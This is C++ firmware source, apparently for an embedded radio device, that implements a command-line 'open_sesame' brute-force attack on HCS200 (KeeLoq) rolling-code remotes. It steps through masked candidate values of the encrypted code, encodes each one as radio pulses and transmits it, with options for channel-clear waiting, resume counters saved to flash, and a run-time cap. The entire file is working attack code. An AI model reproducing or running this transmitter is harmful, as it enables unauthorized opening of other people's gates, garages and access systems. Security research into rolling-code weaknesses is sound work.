//------------------------------------------------------------------------------------------------------------------
#include "OS_HCS200.h"

//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200(void* parent,int argc, char* argv[])
{
     int idx = 0 ;
     cmd_handler_t* item = &open_sesame_hcs200_sub_cmd[idx];

     if (argc < 3)
        return open_sesame_hcs200_help(parent, argc, argv);
     
     while (item && item->handler != 0)
     {
            if (String(argv[2]) == item->cmd)
            {
                return item->handler(getRootCommandHandler(), argc, argv);
            }
            idx++;
            item = &open_sesame_hcs200_sub_cmd[idx];
      
     }
    
     return COMMAND_NOT_FOUND;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_help(void* parent,int argc, char* argv[])
{
     STDOUT.println(open_sesame_sub_cmd[1].desc);

     int idx = 0 ;
     cmd_handler_t* item = &open_sesame_hcs200_sub_cmd[idx];
     while (item && item->handler != 0)
     {
            STDOUT.print("- ");
            STDOUT.print(item->cmd);
            STDOUT.print( " : ");
            STDOUT.println( item->desc);

            idx++;
            item = &open_sesame_hcs200_sub_cmd[idx];
      
     }
    
     return OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_cont(void* parent,int argc, char* argv[])
{
   int cont = atoi(argv[3]);
   
   if (cont < 0 || cont > 1)
   {
       getRootCommandHandler()->setResultMessage("wrong continuation flag: 0 - 1");
       return WRONG_PARAMS;
   }
  
   hcs200_ctx.cont = cont ? true : false;

   return OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_setcode(void* parent,int argc, char* argv[])
{
   uint32_t enc = strtoul(argv[3], 0, 16);
   uint32_t serial = strtoul(argv[4], 0, 16);      
   uint32_t btn = strtoul(argv[5], 0, 16); 
   
   hcs200_ctx.enc = enc;
   hcs200_ctx.serial = serial & 0xFFFFFFF; //28bits
   hcs200_ctx.btn = btn & 0xF;
   hcs200_ctx.use_rssi = false;

   if (enc == 0 || serial == 0)
       return WRONG_PARAMS;
   
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_setmask(void* parent,int argc, char* argv[])
{
   uint32_t encmsk = strtoul(argv[3], 0, 16);
   
   hcs200_ctx.encmsk = encmsk;

   if (encmsk == 0)
      return WRONG_PARAMS;
   
    
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_setirange(void* parent,int argc, char* argv[])
{
   uint32_t v1 = strtoul(argv[3], 0, 16);
   uint32_t v2 = strtoul(argv[4], 0, 16);   
   
   hcs200_ctx.itstart = v1;
   hcs200_ctx.itend   = v2;
   
   if (v1 > v2)
       return WRONG_PARAMS;
   
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_setcurr(void* parent,int argc, char* argv[])
{
   uint32_t v = strtoul(argv[3], 0, 16);
   
   hcs200_ctx.curr = v;
   
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
#if USE_FILE_SYSTEM == 1
CmdStatus_e open_sesame_hcs200_setcurrf(void* parent,int argc, char* argv[])
{

   char path[32];
   uint32_t v = 0 ;
   
   sprintf(path, "/%s", argv[3]);
   if (LittleFS.exists(path))
   {
      File f = LittleFS.open(path, "r");
      if (f)
      {
          String s1 = f.readStringUntil(' ');
          String s2 = f.readStringUntil('\n');
          if (s1[s1.length() -1] == ' ')
              s1 = s1.substring(0, s1.length());
          if (s2[s2.length() -1] == '\n')
              s2 = s2.substring(0, s2.length());   
          if (s2[s2.length() -1] == '\r')
              s2 = s2.substring(0, s2.length());    
                  
          v = strtoul(s1.c_str(), 0, 16);
          f.close();
      } else {
        v = 0;
      }
   }
    
   hcs200_ctx.curr = v;

   
   return CmdStatus_e::OK;
}
#endif
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_setibds(void* parent,int argc, char* argv[])
{
  int strategy = atoi(argv[3]);
  
  if (strategy < 0 || strategy > 2)
     return WRONG_PARAMS;

  hcs200_ctx.bit_spread_strategy = strategy;
  return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_smaxt(void* parent,int argc, char* argv[])
{
  int maxt = atoi(argv[3]);
  if (maxt < 0 || maxt > 12 * 3600)
  {
     CmdHandler* handler = (CmdHandler*) parent;
     handler->setHint("wrong max time: 0 - 43200 seconds (12h)");
     return WRONG_PARAMS;
  }

  hcs200_ctx.max_time = maxt;
  return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_setirangea(void* parent,int argc, char* argv[])
{

   if (hcs200_ctx.encmsk ==0)
   {
       CmdHandler* handler = (CmdHandler*) parent;
       handler->setHint("Set iteration mask first , smsk");
       return WRONG_PARAMS;
   }

   uint32_t cnt = count_bits_set_uint32(hcs200_ctx.encmsk);
   
   hcs200_ctx.itstart = 0;
    
   hcs200_ctx.itend =  bitscount_to_max_uint32(cnt);
   
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
String open_sesame_hcs200_ctx_describe(uint32_t enc, uint32_t serial, uint8_t btn, struct HCS200BruteContext_s& ctx, uint32_t startMs)
{
     char buffer[128];
     int progress = ((100 * ctx.curr)/ ctx.itend);
     sprintf(buffer, "cnt:%08x enc: %08x serial: btn:%04x %08x ts:%s prog: %d", 
        ctx.curr, enc, serial, btn, millis_to_time(millis() - startMs).c_str(), progress);

     return String(buffer);
    
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_srssi(void* parent,int argc, char* argv[])
{
    int use_rssi = atoi(argv[3]);
    
    int rssi = atoi(argv[4]);

    int wait_rssi = atoi(argv[5]);
    
    if (use_rssi < 0  || use_rssi > 1)
    {
         getRootCommandHandler()->setResultMessage("wrong use rssi");
         return WRONG_PARAMS;
    }
    if (rssi < -100 || rssi > 100)
    {
        getRootCommandHandler()->setResultMessage("wrong rssi <-100,100>");
        return WRONG_PARAMS;
    }

    if (wait_rssi < 0 || wait_rssi > 10000)
    {
        getRootCommandHandler()->setResultMessage("wrong time after channel occupied");
        return WRONG_PARAMS;
    }

        
   hcs200_ctx.use_rssi = use_rssi ? true : false;
   hcs200_ctx.rssi = rssi;
   hcs200_ctx.rssi_wait_ms = wait_rssi;

   return OK;
} 
//------------------------------------------------------------------------------------------------------------------
void open_sesame_hcs200_store_file_counter(uint32_t val)
{
    char buf[20];
    sprintf(buf, "%08x", val);
    file_write("/os_hcs200.txt", buf, strlen(buf));
}
//------------------------------------------------------------------------------------------------------------------
void open_sesame_hcs200_store_env_counter(uint32_t val)
{
    char buf[20];
    sprintf(buf, "%08x", val);
    env_set("hcs200_sirs", buf);;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_hcs200_process(void* parent,int argc, char* argv[])
{
    uint32_t disp = atoi(argv[3]);
    bool cont = true;
    String msg;
    uint32_t enc;
    uint32_t serial;
    uint8_t btn;
    int pulses;
    int p;
    int opsec;
    
    if (disp == 0 || disp < 2000 || disp > 360000)
    {
         getRootCommandHandler()->setResultMessage("wrong display period");
         return WRONG_PARAMS;
    }
    
    if (hcs200_ctx.enc == 0 || hcs200_ctx.serial == 0)
    {
         getRootCommandHandler()->setResultMessage("check enc, serial codes");
         return WRONG_PARAMS;
    }
    if (hcs200_ctx.itend <= hcs200_ctx.itstart)
    {
         getRootCommandHandler()->setResultMessage("wrong start end range");
         return WRONG_PARAMS;
    }
    if (hcs200_ctx.encmsk == 0)
    {
         getRootCommandHandler()->setResultMessage("wrong enc mask");
         return WRONG_PARAMS;
    } 
    
    STDOUT.print("brute start\n\r");
    STDOUT.print("proto:");
    STDOUT.print(hcs200.getName().c_str());
    STDOUT.print(" enc:");print_hex_uint32(STDOUT, hcs200_ctx.enc);
    STDOUT.print(" serial:");print_hex_uint32(STDOUT, hcs200_ctx.serial);
    STDOUT.print("\n\r");
    STDOUT.print(" encmsk:");print_hex_uint32(STDOUT, hcs200_ctx.encmsk);
    STDOUT.print("\n\r");
    STDOUT.print(" start:");print_hex_uint32(STDOUT, hcs200_ctx.itstart); 
    STDOUT.print(" end:");print_hex_uint32(STDOUT, hcs200_ctx.itend);
    STDOUT.print(" curr:");print_hex_uint32(STDOUT, hcs200_ctx.curr); 
    STDOUT.print("\n\r");
    STDOUT.println(" press ctrl-c/f/d to terminate...");


    if (!hcs200_ctx.cont)
    {
        hcs200_ctx.curr = hcs200_ctx.itstart;
    }
    else
        hcs200_ctx.cont = false;

    uint32_t startMs = millis();
    uint32_t s = startMs;
    
    uint32_t bitLen = count_bits_set_uint32(hcs200_ctx.encmsk);
    
    while(hcs200_ctx.curr <= hcs200_ctx.itend && cont)
    {
       enc = hcs200_ctx.enc;
       serial = hcs200_ctx.serial;
       btn = hcs200_ctx.btn;

       uint32_t v;

       if (hcs200_ctx.bit_spread_strategy == 0)
           v = hcs200_ctx.curr;
       else if (hcs200_ctx.bit_spread_strategy == 1)
           v = bit_spread_assymetric(hcs200_ctx.curr, bitLen);          
       else if (hcs200_ctx.bit_spread_strategy == 2)
           v = bit_spread_quad_assymetric(hcs200_ctx.curr, bitLen);
           
       apply_value_to_bitmask_32(&enc, hcs200_ctx.encmsk, v);
       
       hcs200.setData(enc, serial, btn, false, false, false);

       radio_pulses_flush();


       pulses = 0;
       hcs200.toPulses(radio_pulses_get_pulses(), radio_pulses_max_count(), &p, 0);       
       pulses += p;
       hcs200.toPulses(&radio_pulses_get_pulses()[pulses], radio_pulses_max_count() - pulses, &p, 1);
       pulses += p;

       if(hcs200_ctx.use_rssi)
       {
          bool printMark = false;
          uint32_t rs = millis();
          
          while (getRadio()->getRSSI() >= hcs200_ctx.rssi && millis() -rs < hcs200_ctx.rssi_wait_ms)
          {
             if(!printMark)
             {    
                  printMark = true;
                  STDOUT.print("wait clear channel\n\r");
             }
             delayMicroseconds(1000 * hcs200_ctx.rssi_wait_ms);
          }
       }
       
       radio_pulses_send(0, pulses);
       
       if (millis() -s > disp)
       {
           msg = "brut tx:" + open_sesame_hcs200_ctx_describe(enc, serial, btn, hcs200_ctx, startMs);
           STDOUT.print(msg); STDOUT.print("\n\r");
           s = millis();
       }

       hcs200_ctx.curr++;
       #if USE_FILE_SYSTEM == 1
       if (hcs200_ctx.curr  > 0 && (hcs200_ctx.curr % OS_ITERATION_FILE_AUTO_DUMP == 0))
           open_sesame_hcs200_store_env_counter(hcs200_ctx.curr);
       if (hcs200_ctx.curr  > 0 && (hcs200_ctx.curr % (4 * OS_ITERATION_FILE_AUTO_DUMP) == 0))
           open_sesame_hcs200_store_file_counter(hcs200_ctx.curr);
       #endif

       opsec = (millis() - startMs) / 1000;

       if (hcs200_ctx.max_time > 0 && opsec > hcs200_ctx.max_time)
           cont = false;
          
       if (STDIN.available() > 0 && cont)
       {
          byte c = STDIN.read();
          
          if (c == CTRL_C || c == CTRL_F || c == CTRL_D)
          {
              cont = false;
              continue;
          }
       }
    }
    #if USE_FILE_SYSTEM == 1
    //store last counter
    open_sesame_hcs200_store_env_counter(hcs200_ctx.curr);
    open_sesame_hcs200_store_file_counter(hcs200_ctx.curr);
    #endif
    msg = "brut last tx:" + open_sesame_hcs200_ctx_describe(enc,serial,btn, hcs200_ctx, startMs);
    STDOUT.print(msg); STDOUT.print("\n\r");
    STDOUT.print("brute stop\n\r");
    

    return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
